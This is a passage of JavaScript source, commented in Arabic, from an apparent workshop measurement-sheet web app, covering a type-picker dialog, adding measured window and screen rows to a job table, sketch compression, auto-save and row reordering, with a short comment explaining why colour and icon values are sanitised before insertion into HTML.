                 إلى خادم المهاجم بمجرد العرض — بلا جافاسكربت، وبلا أن
                 تخرقها CSP لأن img-src تسمح بـ https.
                 واللون والأيقونة يأتيان من measurementTypes المشتركة.
                 الصواب: safeColor للون، وsafeCls لاسم صنف الأيقونة. */
              '<div class="ws-type-option"><label class="tp-item" style="border-right:4px solid ' + safeColor(d.color) + ';">' +
                '<input type="checkbox" class="tp-cb" value="' + escHtml(d.id) + '">' +
                '<i class="fas ' + safeCls(d.icon) + '" style="color:' + safeColor(d.color) + ';"></i>' +
                '<span>' + escHtml(d.name) + '</span>' +
              '</label><div class="ws-formula-choice" hidden style="padding:0 12px 12px"></div></div>').join('') +
            /* إضافة نوع جديد من داخل النافذة نفسها.
               من يكتشف أن النوع ناقص وهو في منتصف إدخال مقاس كان عليه أن
               يُلغي، ويبحث عن مكان إضافة الأنواع، ويضيف، ثم يعود ويعيد
               كتابة المقاس من أوله. */
            '<button type="button" class="tp-item tp-new" onclick="addTypeFromPicker()">' +
              '<i class="fas fa-plus"></i><span>نوع جديد…</span>' +
            '</button>' +
          '</div>' +
          '<div class="tp-actions">' +
            '<button type="button" class="tp-btn tp-cancel" onclick="closeTypePicker()">إلغاء</button>' +
            '<button type="button" class="tp-btn tp-ok" onclick="confirmTypePicker()">إضافة للجدول</button>' +
          '</div>' +
        '</div>';
      document.body.appendChild(ov);
      ov.querySelectorAll('.tp-cb').forEach(cb => cb.addEventListener('change', wsRenderFormulaChoices));
    }

    function closeTypePicker() {
      const ov = document.getElementById('typePickerOverlay');
      if (ov) ov.remove();
    }

    /* إضافة نوع من داخل نافذة الاختيار: يُضاف ثم يُعاد بناء النافذة
       بالمقاس نفسه محفوظاً، ويكون النوع الجديد مؤشَّراً — فيمضي المستخدم
       بضغطة واحدة بدل أن يبدأ من جديد. */
    function addTypeFromPicker() {
      const picked = Array.from(document.querySelectorAll('#typePickerOverlay .tp-cb:checked'))
        .map(c => c.value);
      const keptChoices = {};
      document.querySelectorAll('#typePickerOverlay .tp-cb:checked').forEach(cb => { keptChoices[cb.value] = cb.closest('.ws-type-option').querySelector('.ws-formula-choice').wsFormulaChoice; });
      const before = getExtraTypes().map(t => t.id);

      closeTypePicker();
      try { addExtraType(); } catch (e) { console.error('addExtraType:', e); }

      const after = getExtraTypes();
      const added = after.find(t => before.indexOf(t.id) === -1);

      openTypePicker();
      // نُعيد ما كان مؤشَّراً، ونؤشّر الجديد معه
      const ov = document.getElementById('typePickerOverlay');
      if (!ov) return;
      const want = added ? picked.concat([added.id]) : picked;
      ov.querySelectorAll('.tp-cb').forEach(cb => { cb.checked = want.indexOf(cb.value) > -1; });
      wsRenderFormulaChoices();
      ov.querySelectorAll('.tp-cb:checked').forEach(cb => { const c=keptChoices[cb.value];if(!c)return;const box=cb.closest('.ws-type-option').querySelector('.ws-formula-choice');const title=c.symbolLabel||c.label+(c.side?' — '+(c.side==='right'?'يمين':'يسار'):'');const b=Array.from(box.querySelectorAll('.ws-formula-card')).find(b=>b.getAttribute('aria-label')===title);if(b)b.click();const select=box.querySelector('.ws-optional-formula');if(select){select.value=c.key||'';select.onchange();} });
      if (added) showMiniToast('أُضيف «' + added.name + '» ✅', '#047480');
    }

    function confirmTypePickerCore() {
      const ov = document.getElementById('typePickerOverlay');
      if (!ov) return;
      const picked = Array.from(ov.querySelectorAll('.tp-cb:checked')).map(c => c.value).filter(Boolean);
      if (!picked.length) { showMiniToast('أشِّر نوعاً واحداً على الأقل', '#157f4a'); return; }

      const w = String((document.getElementById('pw') || {}).value || '').trim();
      const h = String((document.getElementById('ph') || {}).value || '').trim();
      if (!(wsNum(w) > 0) || !(wsNum(h) > 0)) {
        showMiniToast('أدخل العرض والارتفاع أولاً', '#b45309');
        return;
      }
      if (isSheetLocked()) { closeTypePicker(); showMiniToast('🔒 الكراسة محفوظة. للتعديل افتح «تعديل وإضافة مقاسات».', '#16477f'); return; }
      if (isSheetIdleLocked()) { closeTypePicker(); alert(idleLockMessage()); return; }
      if (editingIndex > -1) { closeTypePicker(); alert('⚠️ أنهِ تعديل العنصر الحالي أولاً'); return; }

      wsRenderFormulaChoices();
      const formulaChoices = wsReadFormulaChoices(ov);
      if (!formulaChoices) return;
      const note = String((document.getElementById('note') || {}).value || '');
      let img = '';
      try { img = isCanvasEmpty ? '' : compressSketch(); } catch(e) { img = ''; }
      const unique = Array.from(new Set(picked));
      const baseSelected = unique.some(id => id === 'pvc' || id === 'xtype_pvc_slide' || id === ALUM_ID);
      const defs = getAllTypeDefs();
      const manifestDefs = Array.isArray(PRIMARY_TYPE_MANIFEST) ? PRIMARY_TYPE_MANIFEST : [];
      const extraDefs = (typeof getExtraTypes === 'function' ? getExtraTypes() : []) || [];
      const added = [];

      unique.forEach(id => {
        // The picker is built from the primary manifest plus saved type definitions.
        // A stale local type cache must not silently discard a checked primary type.
        const d = defs.find(x => x.id === id) ||
          manifestDefs.find(x => x.id === id) ||
          extraDefs.find(x => x.id === id);
        if (!d) {
          console.warn('[type-picker] Selected type has no definition:', id);
          return;
        }
        if (id === SER_NORMAL_ID) {
          const x = getExtraTypes().find(t => t.id === id) || { id: id, name: 'سرانتي عادي', color: '#0e91a0', addW: 1, addH: 15 };
          added.push(buildExtraRow(x, w, h, note, baseSelected, img));
        } else {
          added.push(stampNewItem({
            type: id, w: w, h: h, note: note, img: img,
            res: calculateLogic(w, h, id), sel: true, sk: '',
            itemColor: id === 'pvc' ? ((document.getElementById('pcolor') || {}).value || '') : ''
          }));
        }
      });

      if (!added.length) { showMiniToast('تعذر إنشاء صف للمقاس المحدد', '#b42318'); return; }
      added.forEach(x => wsApplyFormula(x, formulaChoices[x.type]));
      added.forEach(x => jobList.push(x));
      added.forEach(x => wsRememberChoice(x.type,w,h,formulaChoices[x.type]));
      ensureOrderIndices();
      closeTypePicker();
      renderExtraChips();
      updateMainActionLabel();
      if (note && !noteHistory.includes(note)) {
        noteHistory.push(note);
        safeSetItem('note_history', JSON.stringify(noteHistory));
      }
      renderTable();
      clearInputs();
      saveCurrentState();
      hideNoteSuggest();
      showMiniToast('تمت إضافة ' + added.length + ' نوع/أنواع للجدول ✅', '#047480');
    }

    // واجهة آمنة لزر «إضافة للجدول»: تُظهر الخطأ بدلاً من فشل صامت،
    // وتمنع النقر المتكرر أثناء تنفيذ الإضافة. بعض أخطاء المسار القديم كانت
    // غير مرئية لأن showMiniToast معطّلة عمداً في هذه الصفحة.
    function confirmTypePicker() {
      const ov = document.getElementById('typePickerOverlay');
      if (!ov) return;
      const btn = ov.querySelector('.tp-btn.tp-ok');
      if (btn && btn.dataset.wsBusy === '1') return;
      if (btn) { btn.dataset.wsBusy = '1'; btn.disabled = true; btn.textContent = 'جارٍ الإضافة…'; }
      try {
        confirmTypePickerCore();
        const stillOpen = document.getElementById('typePickerOverlay');
        if (stillOpen && btn) {
          btn.dataset.wsBusy = '0';
          btn.disabled = false;
          btn.textContent = 'إضافة للجدول';
        }
      } catch (err) {
        console.error('تعذر إضافة الأنواع للجدول:', err);
        const stillOpen = document.getElementById('typePickerOverlay');
        const currentBtn = stillOpen && stillOpen.querySelector('.tp-btn.tp-ok');
        if (currentBtn) {
          currentBtn.dataset.wsBusy = '0';
          currentBtn.disabled = false;
          currentBtn.textContent = 'إضافة للجدول';
        }
        alert('تعذرت إضافة المقاس للجدول. لم تُغلق نافذة الاختيار. التفاصيل: ' + (err && err.message ? err.message : 'خطأ غير معروف'));
      }
    }
    window.confirmTypePicker = confirmTypePicker;

    /* يحوّل لوحة الرسم إلى JPEG مضغوط. الرسم شفاف الخلفية، وJPEG لا يدعم
       الشفافية فتصير سوداء — لذلك نرسمه فوق أبيض أولاً. */
    function compressSketch() {
      try {
        const c = document.createElement('canvas');
        c.width = canvas.width;
        c.height = canvas.height;
        const cx = c.getContext('2d');
        cx.fillStyle = '#ffffff';
        cx.fillRect(0, 0, c.width, c.height);
        cx.drawImage(canvas, 0, 0);
        const out = c.toDataURL('image/jpeg', 0.6);
        // حارس: لو خرج أكبر من PNG لأي سبب، نُبقي الأصل
        const png = canvas.toDataURL();
        return out.length < png.length ? out : png;
      } catch (e) {
        console.error('compressSketch:', e);
        return canvas.toDataURL();
      }
    }

    let editAutoSaveTimer = null;
    function autoCommitEditingForm() {
      if (editingIndex < 0 || isSheetLocked()) return;
      const old = jobList[editingIndex];
      if (!old) return;
      const defs = getAllTypeDefs();
      const d = defs.find(x => x.id === activeType) || defs.find(x => x.id === old.type);
      if (!d) return;
      const wi = document.getElementById(d.w), hi = document.getElementById(d.h);
      const w = wi ? String(wi.value || '').trim() : '';
      const h = hi ? String(hi.value || '').trim() : '';
      if (!w || !h) return;
      old.w = w; old.h = h;
      old.type = d.id;
      old.note = (document.getElementById('note') || {}).value || '';
      old.sk = d.id === 'seranati' ? ((document.getElementById('sk') || {}).value || '') : (old.sk || '');
      old.itemColor = d.id === 'pvc' ? ((document.getElementById('pcolor') || {}).value || '') : (old.itemColor || '');
      old.res = calculateLogic(w, h, d.id);
      if (drawingEditIndex === editingIndex && !isCanvasEmpty) {
        try { old.img = compressSketch(); } catch(e) { old.img = canvas.toDataURL(); }
      }
      old.editedAt = Date.now();
      old.editedBy = currentUserName();
      renderTable();
      calcSum();
      saveCurrentState();
      showMiniToast('✓ تم حفظ التعديل مباشرة', '#047480');
    }
    function scheduleEditAutoSave() {
      if (editingIndex < 0 || isSheetLocked()) return;
      if (editAutoSaveTimer) clearTimeout(editAutoSaveTimer);
      editAutoSaveTimer = setTimeout(() => {
        editAutoSaveTimer = null;
        autoCommitEditingForm();
      }, 500);
    }
    function installEditAutoSaveListeners() {
      document.querySelectorAll('#inputSection input, #inputSection textarea, #inputSection select').forEach(el => {
        if (el.dataset.wsAutoSaveBound === '1') return;
        el.dataset.wsAutoSaveBound = '1';
        el.addEventListener('input', scheduleEditAutoSave, {passive:true});
        el.addEventListener('change', scheduleEditAutoSave, {passive:true});
      });
    }

    function saveEntry() {
      // منع النقر المزدوج في الشبكات الضعيفة والأجهزة البطيئة.
      const nowAction = Date.now();
      if (nowAction - lastEntryActionAt < 450) return;
      lastEntryActionAt = nowAction;
      if (isSheetLocked()) { showMiniToast('🔒 الكراسة محفوظة. للتعديل اضغط «تعديل وإضافة مقاسات» أسفل الجدول.', '#16477f'); return; }
      if (hasPendingSheetChanges() && editingIndex === -1) {
        alert('⚠️ توجد تغييرات غير محفوظة. احفظها أو ألغِها قبل إضافة مقاس جديد.');
        return;
      }
      // 9.9.17 — في وضع الإضافة العادي، الزر يفتح منتقي الأنواع فقط.
      // لا توجد قوائم أنواع ثابتة تحت الزر، ولا استدعاء saveEntry ثانٍ بعد الاختيار.
      if (editingIndex === -1) {
        openTypePicker();
        return;
      }
      const defs = getAllTypeDefs();

      /* ══ اختيار الأنواع أولاً ══
         إذا ضغط المستخدم «إضافة للجدول» ولم يحدد أي نوع بعد، يجب أن تظهر
         نافذة الأنواع فوراً — حتى لو كانت خانات العرض والارتفاع فارغة.
         النسخة السابقة كانت تبني entries وتنفذ `if(entries.length === 0) return`
         قبل الوصول إلى openTypePicker؛ لذلك الضغط على الزر كان يبدو وكأنه لا
         يعمل عندما لا توجد أرقام في الخانات.
         نفتح المنتقي هنا قبل أي تحقق يعتمد على وجود المقاس. بعد الاختيار
         تستدعي confirmTypePicker() saveEntry مرة ثانية، وعندها يستمر المسار
         الطبيعي مع النوع الذي اختاره المستخدم.
         ═══════════════════════════════════════════════════════════════════ */
      if (!isBaseRowIncluded() && getExtraRepeats().length === 0) {
        openTypePicker();
        return;
      }

      /* ══ ضغط الرسم قبل حفظه ══
         canvas.toDataURL() الافتراضية تُنتج PNG بلا ضغط — نحو 25–80 كيلوبايت
         للرسم الواحد بعد ترميز base64.

         والخطر ليس في الحجم بل في **حدّ مستند Firestore: ميغابايت واحد**.
         كراسة فيها ثلاثون مقاساً مرسوماً تتجاوزه، فترفض قاعدة البيانات
         حفظها — **ولا يظهر للمستخدم شيء**، لأن الكتابة لا تنتظر السيرفر
         أصلاً. يعمل يومه كاملاً ويظن كل شيء محفوظاً، ولا يكتشف أن الكراسة
         لم تصل إلا حين يفتحها من جهاز آخر.

         JPEG بجودة 0.6 على خلفية بيضاء يعطي رُبع الحجم تقريباً، والرسم
         خطوط سوداء على أبيض فلا يتأثر وضوحه. */
      const img = isCanvasEmpty ? '' : compressSketch();
      let note = document.getElementById('note').value;
      let sk = document.getElementById('sk').value;
      let pcolor = document.getElementById('pcolor').value;

      function buildEntry(d) {
        const wi = document.getElementById(d.w), hi = document.getElementById(d.h);
        const w = wi ? wi.value : '', h = hi ? hi.value : '';
        if(!w || !h) return null;
        return stampNewItem({ type: d.id, w, h, note, img, res: calculateLogic(w, h, d.id), sel: true, sk: d.id === 'seranati' ? (sk || 'سكة') : '', itemColor: d.id === 'pvc' ? (pcolor || '') : '' });
      }

      if(editingIndex > -1) {
        // وضع التعديل: عنصر واحد فقط يُحدَّث (نأخذ أول قسم معبأ)
        let entry = null;
        for(const d of defs) { entry = buildEntry(d); if(entry) break; }

        if(!entry) return;

        // الحفاظ على رقم الترتيب الأصلي للعنصر عند تعديله، حتى تبقى "إعادة الترتيب الأصلي" صحيحة لاحقاً
        const prev = jobList[editingIndex] || {};
        if (entry.type === prev.type) ['cuttingFormula','openingDirection','formulaLabel','openingSymbol','cuttingSymbol','symbolLabel','leafLayout'].forEach(k => { if (prev[k] !== undefined) entry[k] = prev[k]; });
        if(typeof prev.ord === 'number') entry.ord = prev.ord;
        // وقت الإضافة الأصلي يبقى كما هو: التعديل لا يجدّد مهلة الساعتين
        if(typeof prev.addedAt === 'number') entry.addedAt = prev.addedAt;
        if(prev.addedBy) entry.addedBy = prev.addedBy;
        entry.editedAt = Date.now();
        entry.editedBy = currentUserName();

        jobList[editingIndex] = entry;
        pendingEditRowIndex = editingIndex;

        /* ══ العلامات المضافة أثناء التعديل ══
           إن أشّر المستخدم أنواعاً لم تكن مؤشَّرة قبل التعديل، تُضاف صفوفاً
           جديدة بنفس المقاس بعد الصف المعدَّل مباشرةً.

           لماذا هذا مطلوب: يفتح المستخدم صفاً ليصحّح مقاسه فيتذكّر أن معه
           سرانتي أو ناموسية، فيؤشّرها ويضغط «حفظ التعديل». كانت العلامة
           تُهمَل تماماً بلا أي تنبيه — يظن أنه أضافها وهي لم تُضَف، فينقص
           الشغل من الجدول ومن الفاتورة معاً.

           لا يُضاف نوع الصف المعدَّل نفسه، فلا يتكرر مرتين. */
        const editRepeats = getExtraTypes()
          .filter(t => isExtraRepeating(t.id) && t.id !== entry.type);
        const editBaseWanted = isBaseRowIncluded() && entry.type !== 'pvc';

        if (editRepeats.length || editBaseWanted) {
          const added = [];
          // نفس منطق مسار الإضافة: قاعدة السرانتي العادي تعمل مع الأساس أو الألمونيوم
          const withBase = editBaseWanted || entry.type === 'pvc' || entry.type === 'xtype_pvc_slide' || entry.type === ALUM_ID
                        || editRepeats.some(r => r.id === ALUM_ID);
          if (editBaseWanted) {
            const baseDef = getAllTypeDefs().find(d => d.id === 'pvc');
            if (baseDef) added.push(stampNewItem({
              type: 'pvc', w: entry.w, h: entry.h, note: entry.note || '', img: entry.img || '',   // 9.0.3
              res: calculateLogic(entry.w, entry.h, 'pvc'), sel: true, sk: '', itemColor: ''
            }));
          }
          editRepeats.forEach(x => added.push(buildExtraRow(x, entry.w, entry.h, entry.note, withBase, entry.img)));
          // تُدرج بعد الصف المعدَّل مباشرةً لا في آخر الجدول، فتبقى مجموعة الزبون متجاورة
          jobList.splice(editingIndex + 1, 0, ...added);
          showMiniToast('أُضيف ' + added.length + ' صفاً من الأنواع التي أشّرتها ✅', '#047480');
        }

        // العلامات تخصّ هذه العملية وحدها: تُمسح بعدها كما في مسار الإضافة
        includeBaseRow = false;
        clearExtraRepeats();
        renderExtraChips();


        editingIndex = -1;
        editOpenedAt = 0;
        updateMainActionLabel();
        document.getElementById('editHint').style.display = 'none';
        // «حفظ التعديل» هو نقطة الاعتماد الوحيدة للتعديل.
        clearPendingSheetChanges();
        saveCurrentState();
      } else {
        // وضع الإضافة العادي: يمكن تعبئة قسم واحد فقط، أو أكثر من قسم (بيفيسي + سرانتي + أي أنواع أخرى مضافة)
        // وستتم إضافة كل قسم معبأ كصف مستقل في الجدول بضغطة واحدة على "إضافة للجدول"
        // (حقول الإضافات السريعة مستثناة هنا: هي لا تُملأ يدوياً إلا أثناء تعديل صف من نوعها)
        let entries = defs.filter(d => !d.extra || d.asType).map(buildEntry).filter(Boolean);

        /*
         * مسار نافذة اختيار الأنواع: الأنواع في النافذة لا تحتاج حقول مقاس
         * مستقلة. المقاس المكتوب في خانة PVC هو مصدر المقاس المشترك، ثم نبني
         * صفاً مستقلاً لكل نوع اختاره المستخدم. هذا يمنع فشل «إضافة للجدول»
         * عندما يختار المستخدم ناموسية/سرانتي/صندوق فقط بينما حقول النوع
         * الخاصة به غير موجودة أو فارغة.
         */
        const selectedRepeats = getExtraTypes().filter(t => isExtraRepeating(t.id));
        if(entries.length === 0 && selectedRepeats.length > 0) {
          const bw = String((document.getElementById('pw') || {}).value || '').trim();
          const bh = String((document.getElementById('ph') || {}).value || '').trim();
          if(!bw || !bh) {
            showMiniToast('أدخل العرض والارتفاع أولاً ثم اختر النوع', '#b45309');
            return;
          }
          entries = [{
            type: 'measurement_source', w: bw, h: bh, note, img,
            res: null, sel: true, sk: '', itemColor: ''
          }];
        }

        if(entries.length === 0) return;

        /* كل إضافة عليها علامة ✓ تُضاف كصف مستقل بنفس المقاس تماماً وباسمها هي.
           يجب تجهيز القائمة قبل استخدامها في قواعد السرانتي؛ في النسخة السابقة
           كانت `repeats` تُستخدم هنا قبل تعريفها، فيتوقف saveEntry بخطأ JavaScript
           قبل الوصول إلى openTypePicker، ولذلك عند الضغط على «إضافة للجدول»
           لا تظهر نافذة اختيار الأنواع. */
        const repeats = selectedRepeats.length ? selectedRepeats : getExtraTypes().filter(t => isExtraRepeating(t.id));

        /* إذا كُتب PVC أو ألمونيوم في نفس عملية الإضافة مع «سرانتي عادي»،
           فالسرانتي ليس مقاساً مستقلاً: يُحسب من مقاس الفتحة الأساسية.
           أما إذا كان السرانتي وحده فلا نلمس المقاس المكتوب. */
        /* لا نعتبر مجرد وجود أرقام في خانات PVC دليلاً على أن PVC اختير.
           هذه هي النقطة التي كانت تجعل «سرانتي عادي فقط» يأخذ +1/+15 رغم أن
           المستخدم لم يضف PVC. مصدر قاعدة السرانتي يجب أن يكون نوعاً أساسياً
           مختاراً فعلاً: PVC/سحاب عبر includeBase، أو ألمونيوم عبر علامة النوع.
           أما وجود أرقام PVC في النموذج وحده فهو مجرد مصدر إدخال مشترك. */
        const baseEntry = entries.find(e => e && (e.type === 'pvc' || e.type === 'xtype_pvc_slide' || e.type === ALUM_ID)) ||
          entries.find(e => e && e.type === 'measurement_source');
        const aluminumSelected = repeats.some(r => r && r.id === ALUM_ID) ||
          entries.some(e => e && e.type === ALUM_ID);
        const baseSelected = !!includeBase || aluminumSelected;
        if(baseEntry && baseSelected) {
          const normalEntry = entries.find(e => e && e.type === SER_NORMAL_ID);
          if(normalEntry) {
            const normalDef = getExtraTypes().find(t => t && t.id === SER_NORMAL_ID) || { id: SER_NORMAL_ID };
            const d = extraDim(normalDef, baseEntry.w, baseEntry.h);
            normalEntry.w = d.w;
            normalEntry.h = d.h;
            normalEntry.res = calculateLogic(d.w, d.h, SER_NORMAL_ID);
            const auto = 'مقاس السرانتي محسوب من ' + baseEntry.w + '×' + baseEntry.h;
            normalEntry.note = [normalEntry.note || '', auto].filter(Boolean).join(' — ');
          }
        }

        // كل إضافة عليها علامة ✓ تُضاف كصف مستقل بنفس المقاس تماماً وباسمها هي
        /* PVC غير مؤشَّرة وبلا أي إضافة مؤشَّرة = لا شيء يُضاف
           إطلاقاً. نمنع ذلك برسالة صريحة بدل ابتلاع المقاس بصمت. */
        const includeBase = isBaseRowIncluded();
        if(!includeBase && repeats.length === 0) {
          /* بدل تحذير يوقف العمل ويطالب المستخدم بالرجوع والتأشير، نعرض
             الأنواع نفسها ليختار منها هنا ويمضي. النسيان وارد ومتكرر،
             والتحذير وحده يجعله يبحث بعينه عن الخانات ثم يعيد الضغط —
             خطوتان زائدتان في كل مرة. */
          openTypePicker();
          return;
        }

        entries.forEach(entry => {
          // المصدر المؤقت القادم من نافذة الأنواع ليس صفاً مستقلاً.
          if(entry.type === 'measurement_source') return;
          // الصف الأساسي يُضاف فقط إن كانت خانته مؤشَّرة
          if(includeBase) jobList.push(entry);
          /* withBase = هل يُضاف صف الأبواب والنوافذ/الألمونيوم مع هذه العلامة؟
             هو ما يحدّد تطبيق قاعدة السرانتي العادي من عدمه. */
          /* وجود مقاس في خانة PVC لا يعني أن PVC اختير. قاعدة السرانتي
             لا تعمل إلا إذا كان PVC/سحاب مؤشراً فعلاً أو تم اختيار ألمونيوم. */
          const withBase = !!includeBase || repeats.some(r => r && r.id === ALUM_ID) ||
            entries.some(e => e && e.type === ALUM_ID && repeats.some(r => r && r.id === ALUM_ID));

          /* ⚠️ 9.1.0 — الإضافات تُركَّب على شبّاك البيفيسي وحده.
             كانت تُطبَّق على **كل** قسم معبَّأ. وبعرض الأقسام كلها معاً صار
             ذلك ضرراً مؤكَّداً لا محتملاً: من يملأ بيفيسي وألمونيوم ويؤشّر
             ناموسية يخرج بناموسيتين — واحدة لكل قسم — وهو لم يطلب إلا واحدة.
             فتزيد الفاتورة صفاً لا وجود له في الطلب، زيادةً صامتة.
             وهذا القيد هو نفس ما كان يفرضه extrasAllowedFor، منقولاً إلى
             موضعه الصحيح: لحظة البناء لا لحظة العرض. */
          if (extrasAllowedFor(entry.type)) {
            repeats.forEach(x => jobList.push(buildExtraRow(x, entry.w, entry.h, entry.note, withBase, entry.img)));
          }
        });

        /* كل العلامات تُمسح بعد كل إضافة — بما فيها PVC.
           المقاس التالي يبدأ نظيفاً تماماً، ويختار له المستخدم نوعه بنفسه. */
        includeBaseRow = false;
        clearExtraRepeats();
        renderExtraChips();

        updateMainActionLabel();

        if(note && !noteHistory.includes(note)) {
          noteHistory.push(note);
          safeSetItem('note_history', JSON.stringify(noteHistory));
        }
      }
      renderTable(); clearInputs(); saveCurrentState();
      hideNoteSuggest();
    }

    /* ⚠️ إصلاح 8.8 — خللان متشابكان في اقتراحات الملاحظات:

       ١) خانة ملاحظة المقاس (#note) كانت تستدعي oninput="onNoteInput(this)"
          — ودالة onNoteInput **غير معرَّفة في أي ملف إطلاقاً**. فصندوق
          الاقتراحات المخصّص لها (#noteSuggest) لم يُملأ ولو مرة واحدة،
          ومع كل حرف يُطبع خطأ في الـ console. أي أن الخاصية كانت ميتة
          تماماً بينما مكانها ظاهر في الواجهة.

       ٢) والأسوأ: الاقتراحات الوحيدة العاملة كانت معلّقة على **الخانة
          الخطأ**. مربّع ملاحظات الكراسة (#sheetNotes) يستدعي
          handleNoteSuggestions، وهي تعرض قائمة تكتب — عند الضغط —
          في #note أي في ملاحظة المقاس. فمن يكتب ملاحظة على الكراسة
          ويضغط اقتراحاً يجد النص ذهب إلى حقل آخر تماماً.

       الآن: الاقتراحات تعمل على خانة المقاس وحدها، مصدرها noteHistory
       وهو أصلاً مبنيّ من ملاحظات المقاسات، وتكتب في الخانة نفسها. */
    function onNoteInput(el) {
      const val  = (el && el.value != null) ? String(el.value).trim() : '';
      const box  = document.getElementById('noteSuggest');
      if (!box) return;
      if (!val) { box.style.display = 'none'; box.innerHTML = ''; return; }
      const matches = noteHistory.filter(n => n && n !== val && n.includes(val)).slice(0, 8);
      if (!matches.length) { box.style.display = 'none'; box.innerHTML = ''; return; }
      box.innerHTML = matches
        .map(m => `<div class="suggest-item" onclick="selectNote('${escAttr(m)}')">${escHtml(m)}</div>`)
        .join('');
      box.style.display = 'block';
    }
    window.onNoteInput = onNoteInput;

    // اسم قديم مُبقى للتوافق مع أي استدعاء متبقٍّ — يوجّه للخانة الصحيحة
    function handleNoteSuggestions() {
      onNoteInput(document.getElementById('note'));
    }

    function selectNote(val) {
      const el = document.getElementById('note');
      if (el) { el.value = val; }
      hideNoteSuggest();
    }

    function hideNoteSuggest() {
      const box = document.getElementById('noteSuggest');
      if (box) { box.style.display = 'none'; box.innerHTML = ''; }
      const legacy = document.getElementById('suggestions');
      if (legacy) legacy.style.display = 'none';
    }

    document.addEventListener('click', (e) => {
      if(!e.target.closest('#note') && !e.target.closest('#noteSuggest')) {
        hideNoteSuggest();
      }
    });

    // يحسب رقم كل عنصر ضمن نوعه فقط (ترقيم مستقل لكل نوع بدل الترقيم التسلسلي العام على كامل الجدول)
    function computeTypeNumbers(list) {
      const counters = {};
      return list.map(i => {
        counters[i.type] = (counters[i.type] || 0) + 1;
        return counters[i.type];
      });
    }

    // يضمن أن كل عنصر يحمل رقم ترتيب أصلي ثابت (ord) حتى تعمل "استعادة الترتيب الأصلي" بشكل صحيح،
    // بما في ذلك مع بيانات قديمة لم تكن تحمل هذا الحقل من قبل
    function ensureOrderIndices() {
      let maxOrd = -1;
      jobList.forEach(item => { if(typeof item.ord === 'number' && item.ord > maxOrd) maxOrd = item.ord; });
      jobList.forEach(item => { if(typeof item.ord !== 'number') { maxOrd++; item.ord = maxOrd; } });
    }

    /* ══════════════════════════════════════════════════════════════════
       تحريك صفّ المقاسات لأعلى ولأسفل — 9.4.0
       ══════════════════════════════════════════════════════════════════
       لم تكن هناك آليةٌ لهذا إطلاقاً. الحقل `ord` موجود منذ البداية،
       وأزرار الترتيب الجماعي موجودة (تجميع حسب النوع، ترتيب حسب اللون،
       الترتيب الأصلي) — لكن **لا سبيل لتحريك صفّ واحد**. فمن أراد نقل
       مقاس مكانه لم يجد إلا حذفه وإعادة إدخاله، وذلك يفقده ختم من أدخله
       ووقتَه ومهلةَ تعديله.

       والحاجة حقيقية: ترتيب المقاسات في الكراسة هو ترتيب العمل في الورشة
       — يُقصّ من أعلى الورقة إلى أسفلها. فمن قدّم شبّاكاً على باب أراد
       أن يُقصّ الشبّاك أولاً.

       والتبديل يقع على `ord` لا على موضع العنصر في المصفوفة، لأن العرض
       قد يكون مُرتَّباً بغير الترتيب الأصلي (تجميعاً حسب النوع مثلاً).
       فتبديل مواضع المصفوفة حينها يُحرّك صفّاً غير الذي ضغط عليه
       المستخدم — وهو أسوأ من ألّا يتحرك شيء. */
    function moveRow(idx, dir) {
      if (isSheetLocked()) { showMiniToast('🔒 الكراسة محفوظة. للتعديل اضغط «تعديل وإضافة مقاسات» أسفل الجدول.', '#16477f'); return; }
      const item = jobList[idx];
      if (!item) return;
      if (!canEditItem(item)) { alert(editLockMessage ? editLockMessage(item) : '⛔ انتهت مهلة تعديل هذا المقاس.'); return; }

      ensureOrderIndices();
      /* الجار في **الترتيب المعروض** لا في المصفوفة: نرتّب نسخة حسب ord
         ونجد من يليه فعلياً على الشاشة. */
      const sorted = jobList.map((it, n) => ({ it, n })).sort((a, b) => a.it.ord - b.it.ord);
      const pos = sorted.findIndex(x => x.n === idx);
      const other = sorted[pos + (dir < 0 ? -1 : 1)];
      if (!other) return;                       // أوّل الجدول أو آخره
      if (!canEditItem(other.it)) { alert('⛔ المقاس المجاور مقفول — لا يمكن تبديل الترتيب معه.'); return; }

      const t = item.ord; item.ord = other.it.ord; other.it.ord = t;
      jobList.sort((a, b) => a.ord - b.ord);    // المصفوفة تتبع الترتيب فيبقى العرض متسقاً
      renderTable();
      saveCurrentState();
      try { if (navigator.vibrate) navigator.vibrate(12); } catch (e) {}
    }

    function directRowEdit(idx, field, input) {
      if (isSheetLocked()) { showMiniToast('🔒 الكراسة محفوظة. للتعديل اضغط «تعديل وإضافة مقاسات» أسفل الجدول.', '#16477f'); return; }
      pendingEditRowIndex = idx;
      if (isSheetIdleLocked()) { alert(idleLockMessage()); renderTable(); return; }
      const item = jobList[idx];
      if (!item || !canEditItem(item)) { alert(lockMessage(item)); renderTable(); return; }
      item[field] = input.value;
      if (field === 'w' || field === 'h') {
        const w = wsNum(item.w), h = wsNum(item.h);
        if (w > 0 && h > 0) {
          const d = getAllTypeDefs().find(x => x.id === item.type);
          item.res = (typeof calculateLogic === 'function') ? calculateLogic(item.w, item.h, item.type) : item.res;
        }
      }
      calcSum();
      updateMainActionLabel();
      saveCurrentState();
      showMiniToast('✏️ تم تعديل المقاس وحفظه مباشرة', '#047480');
    }

    // V361: فصل الرسم اليدوي عن الرمز الهندسي، دون تعديل أي منهما بالخطأ.
    function openRowMediaChoices(idx) {
      const item=jobList[idx]; if(!item)return;
      if(isSheetLocked()||isSheetIdleLocked()||!canEditItem(item)) {
        showMiniToast('افتح الكراسة للتعديل أو راجع المدير', '#a65b00');return;
      }
      const overlay=document.createElement('div');
      overlay.className='tp-overlay';
      overlay.innerHTML='<div class="tp-box" role="dialog" aria-label="تعديل الرسم أو الرمز" style="max-width:360px"><h3>ماذا تريد تعديل؟</h3><div class="tp-actions" style="display:grid;gap:10px"><button type="button" class="tp-btn ws-edit-drawing">✏️ تعديل الرسم</button><button type="button" class="tp-btn ws-edit-symbol">🚪 تعديل الرمز</button><button type="button" class="tp-btn ws-close-media">إلغاء</button></div></div>';
      document.body.appendChild(overlay);
      const close=()=>overlay.remove();
      overlay.querySelector('.ws-close-media').onclick=close;
      overlay.querySelector('.ws-edit-drawing').onclick=()=>{close();openRowDrawing(idx);};
      overlay.querySelector('.ws-edit-symbol').onclick=()=>{close();wsChooseExecutionSymbol(idx);};
      overlay.addEventListener('click',e=>{if(e.target===overlay)close();});
    }
    function wsIsDoorRow(row) {
      const sym=String(row.cuttingSymbol||row.openingSymbol||'');
      const formula=String(row.cuttingFormula||'');
      return sym.startsWith('door-')||sym.includes('-door-')||formula.startsWith('door_')||formula.startsWith('aluminum_door');
    }
    function wsSetDoorBottomNote(idx) {
